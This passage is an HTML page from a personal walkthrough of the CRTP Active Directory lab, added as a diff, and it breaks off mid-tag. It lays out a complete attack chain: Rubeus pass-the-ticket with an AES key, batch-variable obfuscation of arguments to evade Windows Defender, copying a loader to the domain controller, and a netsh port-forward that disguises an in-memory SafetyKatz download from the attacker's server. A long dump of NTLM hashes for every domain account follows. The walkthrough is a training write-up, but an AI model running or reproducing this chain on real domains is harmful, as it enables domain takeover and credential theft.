@@ -1,0 +1,1020 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Privilege Escalation (Derivative Local Admin) - CRTP</title>
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .project-sidebar { padding: 20px; }
+    .project-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .project-sidebar .portfolio-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .project-sidebar .portfolio-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .project-sidebar a { 
+      display: block; 
+      padding: 8px 12px; 
+      margin: 4px 0; 
+      color: #d6d6d6; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      transition: all 0.2s; 
+    }
+    .project-sidebar a:hover { 
+      background: #2a2a2a; 
+      color: #ffdb70; 
+    }
+    .project-sidebar a.active { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+      font-weight: 600; 
+    }
+    
+    .notion-content { 
+      line-height: 1.6; 
+    }
+    .notion-content img { 
+      max-width: 100%; 
+      height: auto; 
+      margin: 20px 0; 
+      border-radius: 8px; 
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+    }
+    .notion-content h1 { 
+      font-size: 1.8rem; 
+      margin: 30px 0 20px; 
+      color: #fafafa; 
+    }
+    .notion-content h2 { 
+      font-size: 1.5rem; 
+      margin: 25px 0 15px; 
+      color: #fafafa; 
+    }
+    .notion-content h3 { 
+      font-size: 1.3rem; 
+      margin: 20px 0 10px; 
+      color: #fafafa; 
+    }
+    .notion-content p { 
+      margin: 15px 0; 
+      color: #d6d6d6; 
+    }
+    .notion-content ul, .notion-content ol { 
+      margin: 15px 0; 
+      padding-left: 30px; 
+    }
+    .notion-content li { 
+      margin: 5px 0; 
+      color: #d6d6d6; 
+    }
+    .notion-content code { 
+      background: #2a2a2a; 
+      padding: 2px 6px; 
+      border-radius: 4px; 
+      font-family: 'Courier New', monospace; 
+      color: #ffdb70; 
+    }
+    .notion-content pre { 
+      background: #1e1e1e; 
+      border-left: 4px solid #ffdb70; 
+      padding: 15px; 
+      margin: 20px 0; 
+      border-radius: 0 8px 8px 0; 
+      overflow-x: auto; 
+    }
+    .notion-content a { 
+      color: #ffdb70; 
+      text-decoration: underline; 
+    }
+    .notion-content strong { 
+      color: #fafafa; 
+      font-weight: 600; 
+    }
+    .notion-content em { 
+      font-style: italic; 
+    }
+    .notion-content figure { 
+      margin: 20px 0; 
+    }
+    .notion-content figcaption { 
+      display: none; 
+    }
+    .main-content { 
+      max-width: 100% !important; 
+    }
+    .about { 
+      max-width: 100% !important; 
+      padding: 20px 40px !important; 
+    }
+    /* Critical: Code Block Formatting */
+    pre code {
+      white-space: pre;
+      word-break: normal;
+      overflow-x: auto;
+      display: block;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9rem;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Walkthrough</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="project-sidebar">
+          <a href="../" class="portfolio-link">← Portfolio</a>
+          <h3>Sections</h3>
+           <a href="part-01.html">1. PowerShell Detection & Bypass</a>
+           <a href="part-02.html">2. Enumeration Tools</a>
+           <a href="part-03.html">3. Domain Enumeration Techniques</a>
+           <a href="part-04.html">4. Privilege Escalation (Derivative Local Admin)</a>
+           <a href="part-05.html">5. Golden Ticket</a>
+           <a href="part-06.html">6. Silver Ticket & WMI Abuse</a>
+           <a href="part-07.html">7. Diamond Ticket</a>
+           <a href="part-08.html">8. DCSync Attack</a>
+           <a href="part-09.html">9. AS-REP Roasting</a>
+           <a href="part-10.html">10. Unconstrained Delegation + Printer Bug</a>
+           <a href="part-11.html">11. Constrained Delegation</a>
+           <a href="part-12.html">12. Resource-Based Constrained Delegation (RBCD)</a>
+           <a href="part-13.html">13. Trust Enumeration & Abuse</a>
+           <a href="part-14.html">14. Cross-Forest Trust Attacks</a>
+           <a href="part-15.html">15. ADCS Attacks (ESC1, ESC3)</a>
+           <a href="part-16.html">16. Tools Transfer & Execution</a>
+           <a href="part-17.html">17. ASR Rules Bypass (Lateral Movement)</a>
+        </div>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Privilege Escalation (Derivative Local Admin)</header>
+        <section class="about-text notion-content">
+          <h1>Golden Ticket using Rubeus.exe</h1></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8040-8c9d-fcc40be2e332" class=""><code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only, it is also good that we execute ArgSplit.bat first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80b8-9885-f120e32534ad" class=""><code>golden</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8040-a5db-d58d27ecb546" class="code code-wrap"><code class="language-bash">set &quot;z=n&quot;
+set &quot;y=e&quot;
+set &quot;x=d&quot;
+set &quot;w=l&quot;
+set &quot;v=o&quot;
+set &quot;u=g&quot;
+set &quot;Pwn=%u%%v%%w%%x%%y%%z%&quot;</code></pre></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8094-a7b4-d70a5f7c8715" class=""><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-800f-b92c-dae61ea49e1f" class="image"><a href="images/screenshot_121.png"><img style="width:2080px" src="images/screenshot_121.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-804c-88d1-e8b36935e0c2" class="">Once we were able to to run a new process as Domain Admin, let’s use this new CMD session to copy PELoaded.exe into our Domain Controller.<br/>Why are we copying PELoader.exe into Domain Controller? Because once again we want to execute the payloads from the memory, we don’t want to touch the disk at all.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-806c-a950-c32e75c27a96" class=""><code>echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-806c-b0f6-f619a800e8f5" class="image"><a href="images/screenshot_122.png"><img style="width:2256px" src="images/screenshot_122.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8011-89bc-d7b4e28e2824" class="">Ok, now let’s remotely access the Domain Controller using WinRS</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80fc-a6a7-d862c6fa66de" class=""><code>winrs -r:dcorp-dc cmd</code></p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8026-9dc8-e887a4ad46d3" class="">Now if we try to run PELoader.exe straight on the target machine <code><strong>dcorp-dc </strong></code>to execute <strong>SafatyKatz.exe </strong> on the target, we may get caught by the Windows Defender, because we are downloading and running an executable file from our remote server. <br/>To avoid getting caught we can do a portforwarding.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8086-97c8-e512235cbccd" class=""><code>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.51</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8019-824f-c68c2524418a" class="">For you to understand why we are using the loopback IP(127.0.0.1) in our command, during our portforwarding command we specified that whatever comes from any direction(0.0.0.0) to port 8080 should be redirected to our(attacker) IP in port 80, this way, Windows Defender will think that we are downloading and executing SafetyKatz.exe from our the local  web server(in this case  from the target itself), but the request is forwarded to our web server machine where we are hosting the SafetyKatz.exe.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-803d-82a4-d738679e3311" class="">Now let’s use ArgSplit.bat on our attacking machine once again to encode “<code>l</code><code><strong>sadump::lsa</strong></code><code>”</code> and copy it to the session with the Domain Admin. as you can see in the screenshot below.</p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80cf-84bb-d917020c3a7e" class="image"><a href="images/screenshot_123.png"><img style="width:2080px" src="images/screenshot_123.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-807e-b532-d8cf5af2ef25" class="">We have do encoded code below for the argument “<code>lsadump::lsa</code>” . Please also pay attention to this, copy encoded lines to the Domain Admin Session one by one. I tried to do a full copy paste and it create a bug on the execution of the payload.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8038-9e48-e8d929c48ef3" class="code code-wrap"><code class="language-Plain Text">set &quot;z=a&quot;
+set &quot;y=s&quot;
+set &quot;x=l&quot;
+set &quot;w=:&quot;
+set &quot;v=:&quot;
+set &quot;u=p&quot;
+set &quot;t=m&quot;
+set &quot;s=u&quot;
+set &quot;r=d&quot;
+set &quot;q=a&quot;
+set &quot;p=s&quot;
+set &quot;o=l&quot;
+set &quot;Pwn=%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%&quot;</code></pre></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8080-ac41-c40f672fd670" class="">Now we can Download SafetyKatz.exe and execute it in memory… The only moment we are touching the target disk is when we download PELoader.exe, SafetyKatz.exe is being executing in memory and not in the disk at all.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80cd-9f5a-c01b8fe8bbaf" class=""><code>C:\Public&gt;C:\Public\Loader.exe -path </code><code><a href="http://127.0.0.1:8080/SafetyKatz.exe">http://127.0.0.1:8080/SafetyKatz.exe</a></code><code> -args &quot;%Pwn% /patch&quot; &quot;exit&quot;</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8032-bd8b-c2b94a4e938c" class="code code-wrap"><code class="language-Plain Text">Domain : dcorp / S-1-5-21-719815819-3726368948-3917688648
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : af0686cc0ca8f04df42210c9ac980760
+
+RID  : 000001f5 (501)
+User : Guest
+LM   :
+NTLM :
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : 4e9815869d2090ccfca61c1fe0d23986
+
+RID  : 00000459 (1113)
+User : sqladmin
+LM   :
+NTLM : 07e8be316e3da9a042a9cb681df19bf5
+
+RID  : 0000045a (1114)
+User : websvc
+LM   :
+NTLM : cc098f204c5887eaa8253e7c2749156f
+
+RID  : 0000045b (1115)
+User : srvadmin
+LM   :
+NTLM : a98e18228819e8eec3dfa33cb68b0728
+
+RID  : 0000045d (1117)
+User : appadmin
+LM   :
+NTLM : d549831a955fee51a43c83efb3928fa7
+
+RID  : 0000045e (1118)
+User : svcadmin
+LM   :
+NTLM : b38ff50264b74508085d82c69794a4d8
+
+RID  : 0000045f (1119)
+User : testda
+LM   :
+NTLM : a16452f790729fa34e8f3a08f234a82c
+
+RID  : 00000460 (1120)
+User : mgmtadmin
+LM   :
+NTLM : 95e2cd7ff77379e34c6e46265e75d754
+
+RID  : 00000461 (1121)
+User : ciadmin
+LM   :
+NTLM : e08253add90dccf1a208523d02998c3d
+
+RID  : 00000462 (1122)
+User : sql1admin
+LM   :
+NTLM : e999ae4bd06932620a1e78d2112138c6
+
+RID  : 00001055 (4181)
+User : studentadmin
+LM   :
+NTLM : d1254f303421d3cdbdc4c73a5bce0201
+
+RID  : 00003521 (13601)
+User : student441
+LM   :
+NTLM : f35f143c13eee7ec6dbfe94c8976b740
+
+RID  : 00003522 (13602)
+User : student442
+LM   :
+NTLM : 953da8cbdab52254995f7652ab7d6e36
+
+RID  : 00003523 (13603)
+User : student443
+LM   :
+NTLM : 126769e11080d8193c17098c80d96f4a
+
+RID  : 00003524 (13604)
+User : student444
+LM   :
+NTLM : 4f37000dec520d9cb90095a92e6fdabe
+
+RID  : 00003525 (13605)
+User : student445
+LM   :
+NTLM : eec9112ec22e2fc4dc6e0ab5319b667c
+
+RID  : 00003526 (13606)
+User : student446
+LM   :
+NTLM : c2c421bb7b043cb57dadc5770f9f73d2
+
+RID  : 00003527 (13607)
+User : student447
+LM   :
+NTLM : 17a7fd1f569081a534f56b07cf70f1df
+
+RID  : 00003528 (13608)
+User : student448
+LM   :
+NTLM : d5f9e8672c6f64526c1099246a5565f4
+
+RID  : 00003529 (13609)
+User : student449
+LM   :
+NTLM : 6d37173e0de202f6630231dc06e5bb13
+
+RID  : 0000352a (13610)
+User : student450
+LM   :
+NTLM : c2ed42e66206f561d266c3846844fce9
+
+RID  : 0000352b (13611)
+User : student451
+LM   :
+NTLM : 4b11f749c331826c9f1197b617fb47a2
+
+RID  : 0000352c (13612)
+User : student452
+LM   :
+NTLM : 91b5329ca1d44b91502b5f0d93576495
+
+RID  : 0000352d (13613)
+User : student453
+LM   :
+NTLM : abac3975bdb8763dbe96600a2befb3ed
+
+RID  : 0000352e (13614)
+User : student454
+LM   :
+NTLM : 0dd4bf508e520534d215eb73b94094f1
+
+RID  : 0000352f (13615)
+User : student455
+LM   :
+NTLM : e213e2c54ac00bb713a54255cd9b16eb
+
+RID  : 00003530 (13616)
+User : student456
+LM   :
+NTLM : 205efd7b34d015a84c3638f549c7028f
+
+RID  : 00003531 (13617)
+User : student457
+LM   :
+NTLM : 01f47fdd2648ff34bf65365c612768ab
+
+RID  : 00003532 (13618)
+User : student458
+LM   :
+NTLM : 688fa7689cc985eee3b265d9f3fc0707
+
+RID  : 00003533 (13619)
+User : student459
+LM   :
+NTLM : c109389efb9c32b8f6fc21739e3dd51e
+
+RID  : 00003534 (13620)
+User : student460
+LM   :
+NTLM : 85fa1dedc18f503b603322d631cbda56
+
+RID  : 00003535 (13621)
+User : Control441user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003536 (13622)
+User : Control442user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003537 (13623)
+User : Control443user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003538 (13624)
+User : Control444user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003539 (13625)
+User : Control445user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353a (13626)
+User : Control446user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353b (13627)
+User : Control447user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353c (13628)
+User : Control448user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353d (13629)
+User : Control449user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353e (13630)
+User : Control450user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353f (13631)
+User : Control451user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003540 (13632)
+User : Control452user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003541 (13633)
+User : Control453user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003542 (13634)
+User : Control454user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003543 (13635)
+User : Control455user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003544 (13636)
+User : Control456user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003545 (13637)
+User : Control457user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003546 (13638)
+User : Control458user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003547 (13639)
+User : Control459user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003548 (13640)
+User : Control460user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003549 (13641)
+User : Support441user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354a (13642)
+User : Support442user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354b (13643)
+User : Support443user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354c (13644)
+User : Support444user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354d (13645)
+User : Support445user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354e (13646)
+User : Support446user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354f (13647)
+User : Support447user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003550 (13648)
+User : Support448user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003551 (13649)
+User : Support449user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003552 (13650)
+User : Support450user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003553 (13651)
+User : Support451user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003554 (13652)
+User : Support452user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003555 (13653)
+User : Support453user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003556 (13654)
+User : Support454user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003557 (13655)
+User : Support455user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003558 (13656)
+User : Support456user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003559 (13657)
+User : Support457user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000355a (13658)
+User : Support458user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000355b (13659)
+User : Support459user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000355c (13660)
+User : Support460user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000355d (13661)
+User : VPN441user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000355e (13662)
+User : VPN442user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000355f (13663)
+User : VPN443user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003560 (13664)
+User : VPN444user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003561 (13665)
+User : VPN445user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003562 (13666)
+User : VPN446user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003563 (13667)
+User : VPN447user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003564 (13668)
+User : VPN448user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003565 (13669)
+User : VPN449user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003566 (13670)
+User : VPN450user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003567 (13671)
+User : VPN451user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003568 (13672)
+User : VPN452user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003569 (13673)
+User : VPN453user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356a (13674)
+User : VPN454user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356b (13675)
+User : VPN455user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356c (13676)
+User : VPN456user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356d (13677)
+User : VPN457user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356e (13678)
+User : VPN458user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356f (13679)
+User : VPN459user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003570 (13680)
+User : VPN460user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 000003e8 (1000)
+User : DCORP-DC$
+LM   :
+NTLM : 0cfa3b5634cebb44153fa03a3767d396
+
+RID  : 00000451 (1105)
+User : DCORP-ADMINSRV$
+LM   :
+NTLM : b5f451985fd34d58d5120816d31b5565
+
+RID  : 00000452 (1106)
+User : DCORP-APPSRV$
+LM   :
+NTLM : b4cb7bf8b93c78b8051c7906bb054dc5
+
+RID  : 00000453 (1107)
+User : DCORP-CI$
+LM   :
+NTLM : f76f48c176dc09cfd5765843c32809f3
+
+RID  : 00000454 (1108)
+User : DCORP-MGMT$
+LM   :
+NTLM : 0878da540f45b31b974f73312c18e754
+
+RID  : 00000455 (1109)
+User : DCORP-MSSQL$
+LM   :
+NTLM : b205f1ca05bedace801893d6aa5aca27
+
+RID  : 00000456 (1110)
+User : DCORP-SQL1$
+LM   :
+NTLM : 3686dfb420dc0f9635e70c6ca5875b49
+
+RID  : 0000106a (4202)
+User : DCORP-STDADMIN$
+LM   :
+NTLM : e444bbf444732fc38065ea9e9255ab03
+
+RID  : 00003571 (13681)
+User : DCORP-STD441$
+LM   :
+NTLM : 82e28989368af88aa0f035ddff4ad072
+
+RID  : 00003572 (13682)
+User : DCORP-STD442$
+LM   :
+NTLM : e7b7c190753d2ab29967865be6d260de
+
+RID  : 00003573 (13683)
+User : DCORP-STD443$
+LM   :
+NTLM : 8f19dbf75e46fbcc0aa7a9ff41f8f3b0
+
+RID  : 00003574 (13684)
+User : DCORP-STD444$
+LM   :
+NTLM : 804bfc109ef5380520b30efb99520680
+
+RID  : 00003575 (13685)
+User : DCORP-STD445$
+LM   :
+NTLM : 2e03f920b8f2bc2ccfb7d312d68154bc
+
+RID  : 00003576 (13686)
+User : DCORP-STD446$
+LM   :
+NTLM : d2da89b734dece788a5749e1fe3b269e
+
+RID  : 00003577 (13687)
+User : DCORP-STD447$
+LM   :
+NTLM : 03a5a6659bd09d1a13a17a981154f191
+
+RID  : 00003578 (13688)
+User : DCORP-STD448$
+LM   :
+NTLM : f69a2bce7a6fc3ece8a31b74bbb0a011
+
+RID  : 00003579 (13689)
+User : DCORP-STD449$
+LM   :
+NTLM : b130f0e8b8e9f57dca7cab4c38b9e4cb
+
+RID  : 0000357a (13690)
+User : DCORP-STD450$
+LM   :
+NTLM : 90ea7964ab6f9a8ad85222b4a7a04696
+
+RID  : 0000357b (13691)
+User : DCORP-STD451$
+LM   :
+NTLM : ff6cc4201e8eced9bfb472b4a512be5a
+
+RID  : 0000357c (13692)
+User : DCORP-STD452$
+LM   :
+NTLM : e1492c5446ef8f1d20bbfd7b94621add
+
+RID  : 0000357d (13693)
+User : DCORP-STD453$
+LM   :
+NTLM : 9bb950aacf6af1252ff0c83807d2a7c0
+
+RID  : 0000357e (13694)
+User : DCORP-STD454$
+LM   :
+NTLM : c152cec4f187e3330a8f643f7895d4e8
+
+RID  : 0000357f (13695)
+User : DCORP-STD455$
+LM   :
+NTLM : 5f792dbfde97d440bac506b740f5ec99
+
+RID  : 00003580 (13696)
+User : DCORP-STD456$
+LM   :
+NTLM : 29a12940c0b9b39aff5cc795bec365d3
+
+RID  : 00003581 (13697)
+User : DCORP-STD457$
+LM   :
+NTLM : a74b5162dd8790d322466f592b7bd45a
+
+RID  : 00003582 (13698)
+User : DCORP-STD458$
+LM   :
+NTLM : 2c7ccb4be7427ca4e74ecf0023b92ada
+
+RID  : 00003583 (13699)
+User : DCORP-STD459$
+LM   :
+NTLM : 20a2fd33769d00e27939b054c4813021
+
+RID  : 00003584 (13700)
+User : DCORP-STD460$
+LM   :
+NTLM : 5162999bfd616ca987090aa2f6222f10
+
+RID  : 0000044f (1103)
+User : mcorp$
+LM   :
+NTLM : 7d446c3b1516b4b988d7e07e67b221e5
+
+RID  : 00000450 (1104)
+User : US$
+LM   :
+NTLM : f85385d81cc4936d37ff8f27813f43c6
+
+RID  : 00000458 (1112)
+User : ecorp$
+LM   :
+NTLM : 75788d7b488dbc0dbccff755b53494f0</code></pre></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8066-ab36-e426effb86e7" class="">You can see from the output above, that we were able to extract the secrets from the domain controller. <br/>Meaning that we were able to get the whole Domain accounts NTLM hashes. I highlighted the most important ones in red on top of the output.<br/></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-803c-9f78-f2de6b6308a6" class="">So, for our Golden Ticket attack, what we really need here is NTLM and AES key of KRBTGT account, to get this, let’s do a DCSync Attack. Let’s encode our SafetyKatz.exe command with ArgSplit.bat once again and send it to the Domain Admin Session. </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-804a-a610-e4047d78f670" class="">For this DCSync attack to work, we don’t need to connect to the Domain Controller, in this case we don’t need to be inside <code><strong>DCORP-DC</strong></code> machine, It will be executed from our attacking machine using the Domain Admin Session.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-800e-a01b-d2562e2e61b0" class="">Let’s encode the SafetyKatz payload once again using ArgSplit.bat… Since we are running this locally and not with a remote session to another machine we can simply do a copy/paste.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" 